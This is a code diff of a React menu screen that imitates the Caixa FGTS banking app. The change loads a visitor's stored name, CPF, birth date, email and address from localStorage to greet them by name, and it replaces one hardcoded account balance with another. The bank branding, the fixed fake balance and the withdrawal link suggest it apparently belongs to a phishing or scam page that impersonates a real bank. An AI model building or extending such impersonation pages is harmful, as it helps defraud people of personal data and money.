@@ -7,10 +7,31 @@ import logo from "../assets/caixalogo.png";
 import fgts from "../assets/fgts2.png";
 import { BiDollar } from "react-icons/bi";
 import flogo from "../assets/f-logo.png"
+import { UserData } from "../types/userData";
 
 export function Menu() {
     const navigate = useNavigate();
     const [hasPixKey, setHasPixKey] = useState<boolean>(false);
+
+    const [userData, setUserData] = useState<UserData>({
+        nome: "",
+        cpf: "",
+        dataNascimento: "",
+        email: "",
+        cep: "",
+        cidade: "",
+        estado: "",
+        rua: "",
+        numero: ""
+    });
+
+    // Carregar os dados do localStorage ao montar o componente
+    useEffect(() => {
+        const storedUserData = localStorage.getItem("userData");
+        if (storedUserData) {
+            setUserData(JSON.parse(storedUserData));
+        }
+    }, []);
 
     // Verifica no localStorage se há chaves PIX cadastradas
     useEffect(() => {
@@ -35,7 +56,7 @@ export function Menu() {
                 <div className="flex items-center justify-between w-full">
                     <div className="flex items-center space-x-3">
                         <img width={34} src={logo} alt="logo" />
-                        <span className="text-white font-extralight">Olá, VICTOR</span>
+                        <span className="text-white font-extralight">Olá, {userData.nome.split(" ")[0]}</span>
                     </div>
                     <img src={fgts} alt="fgts" width={65} />
                 </div>
@@ -49,7 +70,7 @@ export function Menu() {
                     </div>
 
                     <div className="font-semibold text-3xl px-2">
-                        R$6.439,23
+                        R$3.739,70
                     </div>
 
                     <span className="border-b border-b-white" />
@@ -70,11 +91,11 @@ export function Menu() {
                     <a className="" href="/saquedigital">
                         <div className="font-bold text-xl flex flex-col space-y-2">
                             <div className="flex items-center justify-between text-[#025bab]">
-                                <h3>VICTOR SOUZA ALMEIDA</h3>
+                                <h3>{userData?.nome.toUpperCase()}</h3>
                                 <FaAngleRight />
                             </div>
 
-                            <span className="text-zinc-700">R$6.439,23</span>
+                            <span className="text-zinc-700">R$3.739,70</span>
                         </div>
                     </a>
                     <span className="border-b border-b-zinc-800 my-2" />
